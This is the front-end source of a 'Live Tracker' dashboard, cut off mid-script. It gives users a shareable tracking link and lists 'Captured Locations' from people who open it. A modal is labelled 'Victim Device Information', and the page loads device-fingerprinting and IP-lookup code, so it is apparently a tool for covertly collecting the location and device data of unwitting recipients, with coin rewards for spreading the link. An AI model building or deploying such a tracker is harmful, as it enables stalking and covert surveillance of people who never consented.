 <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Dashboard - Live Tracker</title><script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/cropperjs/1.5.12/cropper.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/cropperjs/1.5.12/cropper.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script><style>@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');:root{--primary-accent:#6a11cb;--secondary-accent:#2575fc;--gold-accent:#f1c40f;--gold-dark:#b7950b;--text-light:#f0f0f0;--text-muted:#a0a0a0;--card-bg:rgba(255, 255, 255, 0.05);--card-border:rgba(255, 255, 255, 0.1);--body-bg:linear-gradient(160deg,#0f0c29 0%,#302b63 50%,#24243e 100%);--danger-color:#e74c3c}body{font-family:'Poppins',sans-serif;background:var(--body-bg);color:var(--text-light);height:100vh;overflow:hidden;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;transition:background .4s,color .4s}body.super-dark-mode{--body-bg:#000000;--card-bg:#1A1A1A;--card-border:rgba(40, 40, 40, 1)}*{box-sizing:border-box;margin:0;padding:0}.container{width:100%;height:100%;padding:25px;display:flex;flex-direction:column;overflow-y:auto}.header{margin-bottom:30px;display:flex;align-items:center;justify-content:space-between;gap:15px;animation:fadeInDown .5s ease-out}@keyframes fadeInDown{from{opacity:0;transform:translateY(-20px)}to{opacity:1;transform:translateY(0)}}.header-left{display:flex;align-items:center;gap:15px;cursor:pointer;min-width:0}.profile-avatar{width:48px;height:48px;border-radius:50%;border:2px solid var(--card-border);object-fit:cover;transition:transform .3s ease,box-shadow .3s}.profile-avatar:hover{transform:scale(1.1);box-shadow:0 0 15px rgba(106,17,203,.5)}.welcome-text .greeting{font-size:.9rem;color:var(--text-muted);margin:0}.welcome-text .username-wrapper{display:flex;align-items:center;gap:8px}.welcome-text h2{font-size:1.4rem;font-weight:600;margin:0;background:linear-gradient(90deg,var(--primary-accent),var(--secondary-accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.welcome-text .edit-icon{width:16px;height:16px;opacity:.6}.controls-wrapper{display:flex;align-items:center;gap:15px;flex-shrink:0}.coin-badge{background:linear-gradient(135deg,rgba(255,215,0,0.1),rgba(218,165,32,0.1));border:1px solid rgba(255,215,0,0.3);padding:5px 12px;border-radius:20px;display:flex;align-items:center;gap:6px;cursor:pointer;transition:all .3s ease}.coin-badge:hover{background:linear-gradient(135deg,rgba(255,215,0,0.2),rgba(218,165,32,0.2));transform:translateY(-2px)}.coin-icon{color:var(--gold-accent);font-weight:bold;font-size:1.1rem}.coin-count{color:var(--gold-accent);font-weight:600;font-size:1rem}.link-section,.location-card,#message-area{padding:25px;border-radius:15px;margin-bottom:30px;background:var(--card-bg);animation:fadeInUp .5s .2s ease-out backwards}@keyframes fadeInUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}h2{margin-top:0;margin-bottom:20px;font-size:1.4rem;font-weight:600}.share-link-wrapper{display:flex;align-items:center;gap:10px;padding:8px;border-radius:10px;background-color:rgba(0,0,0,.2)}#share-link{flex-grow:1;padding:12px;font-size:1rem;background:none;border:none;color:var(--text-light);font-family:'Poppins',sans-serif;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}#copy-btn{flex-shrink:0;padding:10px;border:none;border-radius:8px;cursor:pointer;transition:all .3s ease;background:var(--primary-accent);color:white}#copy-btn:hover{filter:brightness(1.2)}#copy-btn svg{width:20px;height:20px;vertical-align:middle}.locations-section{flex-grow:1;display:flex;flex-direction:column;animation:fadeInUp .5s .4s ease-out backwards}.locations-grid{display:grid;grid-template-columns:1fr;gap:20px}#message-area{text-align:center;margin:auto 0}#message-area svg{width:60px;height:60px;margin-bottom:20px;opacity:.5;filter:drop-shadow(0 0 10px var(--primary-accent))}#message-area h3{margin:0;font-size:1.2rem;font-weight:600}#message-area p{font-size:1rem;color:var(--text-muted)}.location-card{margin-bottom:0;padding:0;overflow:hidden}.card-body{padding:20px;display:grid;grid-template-columns:100px 1fr;gap:10px 15px;align-items:center}.card-body .label{font-size:.9rem;color:var(--text-muted);font-weight:500}.card-body .value{font-size:.95rem;font-weight:400;word-break:break-all}.card-actions{padding:15px 20px;display:flex;justify-content:space-between;align-items:center;gap:15px;background-color:rgba(0,0,0,.2)}.map-link{color:#87CEEB;text-decoration:none;font-weight:600;display:flex;align-items:center;gap:8px;font-size:.9rem;transition:.3s}.map-link:hover{color:var(--text-light)}.map-link.disabled{color:#888;cursor:not-allowed;opacity:.5}.action-btn{padding:10px 20px;font-size:.9rem;border:none;border-radius:8px;font-weight:600;cursor:pointer;transition:all .3s ease;background:linear-gradient(90deg,var(--primary-accent),var(--secondary-accent));color:white}.action-btn:hover{transform:scale(1.05);box-shadow:0 5px 15px rgba(0,0,0,.3)}.earn-btn-wrapper{margin-top:15px}.earn-main-btn{width:100%;padding:12px;background:linear-gradient(90deg,var(--gold-dark),var(--gold-accent));color:#000;font-weight:700;border:none;border-radius:10px;cursor:pointer;transition:all .3s ease;display:flex;align-items:center;justify-content:center;gap:10px;font-size:1rem}.earn-main-btn:hover{transform:translateY(-2px);box-shadow:0 5px 20px rgba(241,196,15,.4)}.theme-switch{position:relative;display:inline-block;width:50px;height:28px}.theme-switch input{opacity:0;width:0;height:0}.slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:#555;transition:.4s;border-radius:28px}.slider:before{position:absolute;content:"";height:20px;width:20px;left:4px;bottom:4px;background-color:white;transition:.4s;border-radius:50%}input:checked+.slider{background-color:var(--primary-accent)}input:checked+.slider:before{transform:translateX(22px)}.modal-overlay{display:none;position:fixed;z-index:1000;left:0;top:0;width:100%;height:100%;background-color:rgba(0,0,0,.6);justify-content:center;align-items:center;backdrop-filter:blur(5px)}.modal-overlay.active{display:flex}.modal-content{background:var(--card-bg);border:1px solid var(--card-border);margin:auto;padding:25px;width:90%;max-width:700px;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,.5);position:relative;animation:scaleIn .3s ease-out;display:flex;flex-direction:column;max-height:90vh}@keyframes scaleIn{from{opacity:0;transform:scale(.9)}to{opacity:1;transform:scale(1)}}.modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;padding-bottom:15px;border-bottom:1px solid var(--card-border)}.modal-header h3{margin:0;font-size:1.3rem;font-weight:600}.modal-close{color:var(--text-muted);font-size:28px;font-weight:700;cursor:pointer;line-height:1}.modal-close:hover{color:var(--text-light)}.modal-body{overflow-y:auto;padding-right:10px}.modal-body .detail-grid{display:grid;grid-template-columns:1fr;gap:10px}.modal-body .detail-item{display:grid;grid-template-columns:160px 1fr;align-items:center;background-color:rgba(0,0,0,.2);padding:12px 15px;border-radius:6px;border-left:3px solid var(--primary-accent)}.modal-body .detail-label{font-weight:500;color:var(--text-muted);font-size:.9rem}.modal-body .detail-value{font-weight:400;color:var(--text-light);text-align:left;word-break:break-all;font-size:.9rem;font-family:monospace}#delete-confirmation-modal .modal-content,#about-modal .modal-content,#no-coins-modal .modal-content{max-width:500px}#delete-confirmation-modal h3{color:var(--danger-color)}.delete-actions{display:flex;justify-content:flex-end;gap:15px;margin-top:20px}#confirm-delete-btn{background:var(--danger-color)}#cancel-delete-btn{background:#555}#profile-page-modal{transform:translateX(100%);transition:transform .4s cubic-bezier(.25,.8,.25,1);position:fixed;top:0;left:0;width:100%;height:100%;background:var(--body-bg);z-index:2000;display:flex;flex-direction:column;padding:0}#profile-page-modal.active{transform:translateX(0)}.profile-page-header{display:flex;align-items:center;padding:15px 20px;flex-shrink:0;gap:20px}.profile-page-header .back-btn{background:none;border:none;color:var(--text-light);font-size:24px;cursor:pointer}.profile-page-header h2{margin:0;font-size:1.4rem}.profile-page-body{padding:0 25px 25px 25px;overflow-y:auto;text-align:center}.profile-user-info{padding:30px 0;margin-bottom:20px}.profile-user-info img{width:100px;height:100px;border-radius:50%;border:3px solid var(--primary-accent);box-shadow:0 0 20px rgba(106,17,203,.4);margin-bottom:15px}.profile-user-info h3{font-size:1.8rem;margin:0 0 5px 0}.profile-user-info p{font-size:1rem;color:var(--text-muted);margin:0;word-break:break-all}.change-profile-link{display:inline-flex;align-items:center;gap:8px;background:none;border:none;color:var(--text-muted);font-size:.9rem;cursor:pointer;margin-top:15px;padding:5px}.change-profile-link:hover{color:var(--text-light)}.change-profile-link svg{width:14px;height:14px}.profile-edit-section{display:none;padding:20px 0}.profile-edit-section.active{display:block}.edit-input-group{margin-bottom:20px;text-align:left}.edit-input-group label{display:block;margin-bottom:8px;font-weight:500}.edit-input-group input{width:100%;padding:12px;border-radius:8px;border:1px solid var(--card-border);background-color:rgba(0,0,0,.2);color:var(--text-light);font-size:1rem}.edit-actions{display:flex;gap:15px}.edit-actions button{width:100%;padding:12px;font-size:1rem;font-weight:600;border-radius:8px;border:none;cursor:pointer}#cancel-edit-btn{background:#555}#save-username-btn{background:var(--primary-accent)}.profile-menu{list-style:none;padding:0;margin:0;text-align:left}.profile-menu-item{background:var(--card-bg);border:1px solid var(--card-border);margin-bottom:15px;border-radius:12px;transition:background-color .2s ease,transform .2s ease}.profile-menu-item:hover{background-color:rgba(255,255,255,.1);transform:scale(1.02)}.profile-menu-item a,.profile-menu-item button{display:flex;align-items:center;gap:15px;padding:18px 20px;text-decoration:none;color:var(--text-light);font-weight:500;font-size:1.1rem;background:none;border:none;width:100%;text-align:left;cursor:pointer}.profile-menu-item.danger a,.profile-menu-item.danger button{color:var(--danger-color)}.profile-menu-item svg{width:22px;height:22px;opacity:.8}#cropper-modal .modal-content{max-width:500px}#cropper-modal,#about-modal,#delete-confirmation-modal,#no-coins-modal{z-index:2100}.cropper-container{width:100%;max-height:400px;margin-bottom:20px}.cropper-container img{max-width:100%}#about-modal .modal-body,#no-coins-modal .modal-body{text-align:center}.about-logo{width:80px;height:80px;filter:drop-shadow(0 0 15px var(--primary-accent));margin-bottom:15px}.about-content h2{font-size:1.8rem;margin:0 0 10px 0}.about-content p{color:var(--text-muted);font-size:1rem;line-height:1.7}.developer-credit{margin-top:30px !important;font-size:.9rem !important}.developer-credit span{font-weight:600;background:linear-gradient(90deg,var(--primary-accent),var(--secondary-accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent}.version{margin-top:5px !important;font-size:.8rem !important;color:#666 !important}#toast-container{position:fixed;top:20px;right:20px;z-index:9999;display:flex;flex-direction:column;gap:10px}.toast{padding:15px 20px;border-radius:8px;color:#fff;box-shadow:0 5px 15px rgba(0,0,0,.3);display:flex;align-items:center;gap:10px;opacity:0;transform:translateX(100%);animation:toast-in .5s forwards}.toast.success{background:linear-gradient(90deg,#27ae60,#2ecc71)}.toast.error{background:linear-gradient(90deg,#c0392b,#e74c3c)}.toast-icon{font-size:1.5rem;font-weight:bold}@keyframes toast-in{to{opacity:1;transform:translateX(0)}}@keyframes toast-out{from{opacity:1;transform:translateX(0)}to{opacity:0;transform:translateX(100%)}}</style></head><body><div class="container"><div class="header"><div class="header-left" id="profile-link-area"><img id="profile-avatar" class="profile-avatar" src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" alt="Avatar"><div class="welcome-text"><p class="greeting">Welcome</p><div class="username-wrapper"><h2 id="welcome-username">Loading...</h2><svg class="edit-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M15.502 1.94a.5.5 0 0 1 0 .706L14.459 3.69l-2-2L13.502.646a.5.5 0 0 1 .707 0l1.293 1.293zm-1.75 2.456-2-2L4.939 9.21a.5.5 0 0 0-.121.196l-.805 2.414a.25.25 0 0 0 .316.316l2.414-.805a.5.5 0 0 0 .196-.12l6.813-6.814z"/><path fill-rule="evenodd" d="M1 13.5A1.5 1.5 0 0 0 2.5 15h11a1.5 1.5 0 0 0 1.5-1.5v-6a.5.5 0 0 0-1 0v6a.5.5 0 0 1-.5.5h-11a.5.5 0 0 1-.5-.5v-11a.5.5 0 0 1 .5-.5H9a.5.5 0 0 0 0-1H2.5A1.5 1.5 0 0 0 1 2.5v11z"/></svg></div></div></div><div class="controls-wrapper"><div class="coin-badge" id="coin-badge-btn"><span class="coin-icon">●</span><span class="coin-count" id="header-coin-count">0</span></div><label class="theme-switch"><input type="checkbox" id="theme-toggle-checkbox"><span class="slider"></span></label></div></div><div class="link-section"><h2>Your Tracking Link</h2><div class="share-link-wrapper"><input type="text" id="share-link" value="Generating..." readonly><button id="copy-btn" title="Copy Link (-5 Coins)"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/><path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5-.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3z"/></svg></button></div><div class="earn-btn-wrapper"><button id="earn-coins-main-btn" class="earn-main-btn"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z"/><path d="M8 4a.5.5 0 0 1 .5.5v3h3a.5.5 0 0 1 0 1h-3v3a.5.5 0 0 1-1 0v-3h-3a.5.5 0 0 1 0-1h3v-3A.5.5 0 0 1 8 4z"/></svg> EARN FREE COINS</button></div></div><div class="locations-section"><h2>Captured Locations</h2><div id="message-area" style="display:none;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"><path d="M12 21C15.5 17.4 19 14.1764 19 10.2C19 6.22355 15.866 3 12 3C8.13401 3 5 6.22355 5 10.2C5 14.1764 8.5 17.4 12 21Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 12C13.1046 12 14 11.1046 14 10C14 8.89543 13.1046 8 12 8C10.8954 8 10 8.89543 10 10C10 11.1046 10.8954 12 12 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg><h3>No Locations Captured Yet</h3><p>Share your tracking link to start gathering intelligence.</p></div><div id="locations-grid" class="locations-grid"></div></div></div><div id="profile-page-modal"><div class="profile-page-header"><button class="back-btn" id="profile-back-btn">←</button><h2>My Profile</h2></div><div class="profile-page-body"><div class="profile-user-info"><img id="profile-page-avatar" src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" alt="User Avatar"><h3 id="profile-page-username"></h3><p id="profile-page-email"></p><button class="change-profile-link" id="change-profile-btn"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M15.502 1.94a.5.5 0 0 1 0 .706L14.459 3.69l-2-2L13.502.646a.5.5 0 0 1 .707 0l1.293 1.293zm-1.75 2.456-2-2L4.939 9.21a.5.5 0 0 0-.121.196l-.805 2.414a.25.25 0 0 0 .316.316l2.414-.805a.5.5 0 0 0 .196-.12l6.813-6.814z"/><path fill-rule="evenodd" d="M1 13.5A1.5 1.5 0 0 0 2.5 15h11a1.5 1.5 0 0 0 1.5-1.5v-6a.5.5 0 0 0-1 0v6a.5.5 0 0 1-.5.5h-11a.5.5 0 0 1-.5-.5v-11a.5.5 0 0 1 .5-.5H9a.5.5 0 0 0 0-1H2.5A1.5 1.5 0 0 0 1 2.5v11z"/></svg><span>Change Profile</span></button></div><div id="profile-edit-section" class="profile-edit-section"><div class="edit-input-group"><label for="edit-username-input">Username</label><input type="text" id="edit-username-input" autocomplete="off"></div><div class="edit-actions"><button id="cancel-edit-btn">Cancel</button><button id="save-username-btn">Save</button></div></div><ul id="profile-menu" class="profile-menu"><li class="profile-menu-item"><button id="edit-profile-btn"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M15.502 1.94a.5.5 0 0 1 0 .706L14.459 3.69l-2-2L13.502.646a.5.5 0 0 1 .707 0l1.293 1.293zm-1.75 2.456-2-2L4.939 9.21a.5.5 0 0 0-.121.196l-.805 2.414a.25.25 0 0 0 .316.316l2.414-.805a.5.5 0 0 0 .196-.12l6.813-6.814z"/><path fill-rule="evenodd" d="M1 13.5A1.5 1.5 0 0 0 2.5 15h11a1.5 1.5 0 0 0 1.5-1.5v-6a.5.5 0 0 0-1 0v6a.5.5 0 0 1-.5.5h-11a.5.5 0 0 1-.5-.5v-11a.5.5 0 0 1 .5-.5H9a.5.5 0 0 0 0-1H2.5A1.5 1.5 0 0 0 1 2.5v11z"/></svg><span>Edit Profile</span></button></li><li class="profile-menu-item"><button id="about-btn"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z"/><path d="m8.93 6.588-2.29.287-.082.38.45.083c.294.055.482.172.583.287.121.127.185.305.185.522 0 .23-.081.4-.24.565-.16.165-.387.277-.63.328l.342.318.002.002.002.002.006.004.012.007.024.012.036.014.048.012.06.01.072.006.082.003.09.002H8.5a.5.5 0 0 0 0-1H7.032l-.009-.008a.5.5 0 0 0-.025-.025l-.005-.004-.002-.002-.001-.002L6.5 9.25l.255-.285.028-.031c.246-.275.396-.583.396-.908 0-.36-.168-.656-.479-.861a1.03 1.03 0 0 0-.744-.255l-.315.048c-.29.049-.422.145-.498.258-.063.094-.078.204-.078.303 0 .22.09.39.24.504.15.115.354.19.608.216l-2.062.259a.5.5 0 0 0-.486.486 1.5 1.5 0 0 0 .393 1.115.5.5 0 0 0 .736.03l.004-.005.012-.012.002-.002a.5.5 0 0 0 .043-.053l.342-.318a.5.5 0 0 0 .138-.415V8.25a.5.5 0 0 0-.5-.5h-1a.5.5 0 0 0 0 1h.5a.5.5 0 0 0 .5.5v.25a1.5 1.5 0 0 0 1.5 1.5h.032l.009.008a.5.5 0 0 0 .025.025l.005.004.002.002.001.002L8.5 12h.032a.5.5 0 0 0 0-1H8.5a.5.5 0 0 0-.5.5v.25a.5.5 0 0 0 .5.5h.032a.5.5 0 0 0 .468-.325l.342-.318a.5.5 0 0 0 .138-.415V9.25a.5.5 0 0 0-.5-.5h-1a.5.5 0 0 0 0 1h.5a.5.5 0 0 0 .5.5v.393c0 .269-.142.524-.393.684l-.002.001-.004.002-.012.007-.024.012-.036.014a.5.5 0 0 0-.048.012l-.06.01-.072.006-.082.003-.09.002H8.5a1.5 1.5 0 0 0 1.5-1.5V7.964c0-.214-.06-.412-.185-.572-.125-.16-.305-.287-.522-.328l-.342-.048A1.5 1.5 0 0 0 6.5 7.5l.002.002a.5.5 0 0 0 .004.005l.012.012.002.002a.5.5 0 0 0 .053.043l.318.342a.5.5 0 0 0 .415.138l.328-.048c.165-.025.322-.087.458-.173.138-.087.255-.203.328-.342.094-.18.142-.38.142-.583 0-.127-.02-.251-.06-.368-.063-.18-.173-.328-.328-.458-.155-.13-.354-.223-.583-.277l-.318-.048a.5.5 0 0 0-.486.486L5.03 7.485a.5.5 0 0 0 .736.03l.004-.005.012-.012.002-.002a.5.5 0 0 0 .043-.053l.285-.255a.5.5 0 0 0 .03-.736l-.005-.004-.012-.012a.5.5 0 0 0-.053-.043l-.255-.285a.5.5 0 0 0-.736-.03l-.004.005-.012.012-.002.002a.5.5 0 0 0-.043.053L5.03 6.515a.5.5 0 0 0-.03.736l.005.004.012.012.002.002a.5.5 0 0 0 .053.043l.255.285c.205.228.483.354.78.354.127 0 .251-.02.368-.06.18-.063.328-.173.458-.328.13-.155.223-.354.277-.583l.048-.318a.5.5 0 0 0-.486-.486l-.259-2.062a.5.5 0 0 0 .03-.736l-.005-.004a.5.5 0 0 0-.053-.043l-.318-.342a.5.5 0 0 0-.415-.138l-.328.048c-.23.034-.437.13-.593.264-.156.135-.259.31-.259.504 0 .23.09.41.24.55.15.14.354.223.608.24l.342.048c.36.05.656.168.86.396.205.228.31.524.31.86 0 .327-.15.635-.396.908l-.028.031-.255.285a.5.5 0 0 0 .03.736l.005.004.012.012.002.002a.5.5 0 0 0 .053.043l.255.285a.5.5 0 0 0 .736.03l.004-.005.012-.012.002-.002a.5.5 0 0 0 .043-.053L8.93 6.588z"/></svg><span>About</span></button></li><li class="profile-menu-item"><a id="contact-us-link" href="#"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M.05 3.555A2 2 0 0 1 2 2h12a2 2 0 0 1 1.95 1.555L8 8.414.05 3.555zM0 4.697v7.104l5.803-3.558L0 4.697zM6.761 8.83l-6.57 4.027A2 2 0 0 0 2 14h12a2 2 0 0 0 1.808-1.144l-6.57-4.027L8 9.586l-1.239-.757zm3.436-.586L16 11.801V4.697l-5.803 3.546z"/></svg><span>Contact Us</span></a></li><li class="profile-menu-item"><a href="terms.html" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M10.854 7.146a.5.5 0 0 1 0 .708l-3 3a.5.5 0 0 1-.708 0l-1.5-1.5a.5.5 0 1 1 .708-.708L7.5 9.793l2.646-2.647a.5.5 0 0 1 .708 0z"/><path d="M3.5 0a.5.5 0 0 1 .5.5V1h8V.5a.5.5 0 0 1 1 0V1h1a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3a2 2 0 0 1 2-2h1V.5a.5.5 0 0 1 .5-.5zM2 2a1 1 0 0 0-1 1v11a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V3a1 1 0 0 0-1-1H2z"/><path d="M2.5 4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5H3a.5.5 0 0 1-.5-.5V4z"/></svg><span>Terms and Conditions</span></a></li><li class="profile-menu-item"><a href="privacy.html" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M5.072.56C6.157.265 7.31 0 8 0s1.843.265 2.928.56c1.11.3 2.229.655 2.887 1.177C14.455 2.28 15 2.934 15 3.558V8.6c0 .72-.344 1.346-.867 1.857l-4.308 3.55a1 1 0 0 1-1.148 0l-4.308-3.55A2.5 2.5 0 0 1 1 8.6V3.558c0-.624.545-1.278 1.185-1.82C2.843 1.215 3.96  .86 5.072.56zM8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 13V2.5A5.5 5.5 0 0 0 2.5 8 5.5 5.5 0 0 0 8 13.5z"/></svg><span>Privacy Policy</span></a></li><li class="profile-menu-item"><button id="modal-logout-btn"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M10 12.5a.5.5 0 0 1-.5.5h-8a.5.5 0 0 1-.5-.5v-9a.5.5 0 0 1 .5-.5h8a.5.5 0 0 1 .5.5v2a.5.5 0 0 0 1 0v-2A1.5 1.5 0 0 0 9.5 2h-8A1.5 1.5 0 0 0 0 3.5v9A1.5 1.5 0 0 0 1.5 14h8a1.5 1.5 0 0 0 1.5-1.5v-2a.5.5 0 0 0-1 0v2z"/><path fill-rule="evenodd" d="M15.854 8.354a.5.5 0 0 0 0-.708l-3-3a.5.5 0 0 0-.708.708L14.293 7.5H5.5a.5.5 0 0 0 0 1h8.793l-2.147 2.146a.5.5 0 0 0 .708.708l3-3z"/></svg><span>Logout</span></button></li><li class="profile-menu-item danger"><button id="modal-delete-btn"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/><path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/></svg><span>Delete Account</span></button></li></ul></div></div><div id="intel-modal" class="modal-overlay"><div class="modal-content"><div class="modal-header"><h3>Victim Device Information</h3><span class="modal-close">×</span></div><div class="modal-body"></div></div></div><div id="delete-confirmation-modal" class="modal-overlay"><div class="modal-content"><div class="modal-header"><h3>Delete Account</h3><span class="modal-close">×</span></div><div class="modal-body"><p>Are you sure you want to permanently delete your account? All of your captured locations and data will be removed. This action cannot be undone.</p><div class="delete-actions"><button id="cancel-delete-btn" class="action-btn">Cancel</button><button id="confirm-delete-btn" class="action-btn">Confirm Delete</button></div></div></div></div><div id="no-coins-modal" class="modal-overlay"><div class="modal-content"><div class="modal-header"><h3>Insufficient Coins</h3><span class="modal-close">×</span></div><div class="modal-body"><p>You need 5 Coins to copy this link. You are out of coins.</p><p style="margin-bottom:20px;color:#b7950b">Spin the wheel to earn free coins instantly!</p><div class="earn-btn-wrapper"><button id="modal-earn-btn" class="earn-main-btn">Spin & Earn</button></div></div></div></div><div id="about-modal" class="modal-overlay"><div class="modal-content"><div class="modal-header"><h3>About Live Tracker</h3><span class="modal-close">×</span></div><div class="modal-body"><div class="about-content"><svg class="about-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"><path d="M12 21C15.5 17.4 19 14.1764 19 10.2C19 6.22355 15.866 3 12 3C8.13401 3 5 6.22355 5 10.2C5 14.1764 8.5 17.4 12 21Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 12C13.1046 12 14 11.1046 14 10C14 8.89543 13.1046 8 12 8C10.8954 8 10 8.89543 10 10C10 11.1046 10.8954 12 12 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg><h2>Live Tracker</h2><p>A powerful and intuitive tool designed to provide real-time location intelligence. Built with modern technology for reliability and ease of use.</p><p class="developer-credit">Developed by <span>Sahil</span></p><p class="version">Version 2.1.0</p></div></div></div></div><div id="cropper-modal" class="modal-overlay"><div class="modal-content"><div class="modal-header"><h3>Crop & Upload</h3><span class="modal-close">×</span></div><div class="modal-body"><div class="cropper-container"><img id="cropper-image" src=""></div><div class="delete-actions"><button id="cancel-crop-btn" class="action-btn">Cancel</button><button id="upload-avatar-btn" class="action-btn">Crop & Upload</button></div></div></div></div><div id="toast-container"></div><input type="file" id="avatar-input" accept="image/*" style="display:none;"><script>let supabase;let loggedInUser=null;let currentUserProfile=null;const allLocationsCache=[];let cropper;async function getDeviceFingerprint(){try{const fp=await FingerprintJS.load();const result=await fp.get();return result.visitorId}catch(e){return"unknown_device"}}async function getIpAddress(){try{const response=await fetch('https://api.ipify.org?format=json');if(!response.ok)return 'N/A';const data=await response.json();return data.ip}catch(err){return 'N/A'}}async function initApp(){try{const response=await fetch("/api/config");const config=await response.json();if(!config.supabaseUrl||!config.supabaseAnonKey)throw new Error("Config not loaded");supabase=window.supabase.createClient(config.supabaseUrl,config.supabaseAnonKey);const{data:{session}}=await supabase.auth.getSession();if(!session){window.location.href="login.html";return}loggedInUser=session.user;currentUserProfile=await setupUserProfile(loggedInUser);if(currentUserProfile){await displayDashboard(currentUserProfile,loggedInUser);listenForBans()}setupEventListeners()}catch(err){console.error("Failed to init app:",err);const msg=err.message||"Unknown error";document.getElementById("message-area").innerHTML=`<h3>Initialization Failed</h3><p>${msg}</p>`;document.getElementById("message-area").style.display="block"}}function addListenerSafe(id,event,handler){const el=document.getElementById(id);if(el){el.addEventListener(event,handler)}}function setupEventListeners(){document.getElementById("theme-toggle-checkbox").addEventListener("change",()=>toggleTheme(loggedInUser.id));addListenerSafe("copy-btn","click",copyShareLink);addListenerSafe("earn-coins-main-btn","click",()=>window.location.href="earn.html");addListenerSafe("coin-badge-btn","click",()=>window.location.href="earn.html");addListenerSafe("modal-earn-btn","click",()=>window.location.href="earn.html");addListenerSafe("profile-link-area","click",()=>document.getElementById("profile-page-modal").classList.add("active"));addListenerSafe("profile-back-btn","click",()=>{document.getElementById("profile-page-modal").classList.remove("active");document.getElementById("profile-edit-section").classList.remove("active");document.getElementById("profile-user-info").style.display="block";document.getElementById("profile-menu").style.display="block"});addListenerSafe("modal-logout-btn","click",signOutUser);document.getElementById("contact-us-link").href="mailto:neeesa05@gmail.com";addListenerSafe("about-btn","click",()=>document.getElementById("about-modal").classList.add("active"));addListenerSafe("edit-profile-btn","click",()=>{document.getElementById("profile-menu").style.display="none";document.getElementById("edit-username-input").value=currentUserProfile.username;document.getElementById("profile-edit-section").classList.add("active")});addListenerSafe("cancel-edit-btn","click",()=>{document.getElementById("profile-edit-section").classList.remove("active");document.getElementById("profile-menu").style.display="block"});addListenerSafe("save-username-btn","click",handleUsernameUpdate);addListenerSafe("modal-delete-btn","click",()=>{docum